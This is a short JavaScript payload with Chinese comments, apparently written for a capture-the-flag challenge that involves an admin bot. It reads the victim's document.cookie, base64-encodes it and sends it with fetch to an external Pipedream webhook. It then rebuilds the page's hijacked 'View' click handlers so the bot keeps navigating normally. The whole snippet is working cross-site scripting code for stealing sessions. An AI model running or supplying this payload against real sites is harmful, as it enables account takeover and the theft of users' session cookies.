// 1. 偷取 Admin 的 Cookie 並傳送到你的接收端
// 請將網址換成你的 Pipedream 或 Webhook 網址
fetch('https://eos82zp0nc2qmhz.m.pipedream.net/?c=' + btoa(document.cookie));

// 2. 核心：還原網頁原本的 "View" 功能
// 因為我們劫持了 js，原本的跳轉功能會失效，如果不寫這段，Admin 機器人可能無法點進去
document.querySelectorAll('.view').forEach((e) => {
    e.addEventListener('click', () => {
        window.location = `/comment/${e.id}`;
    });
});
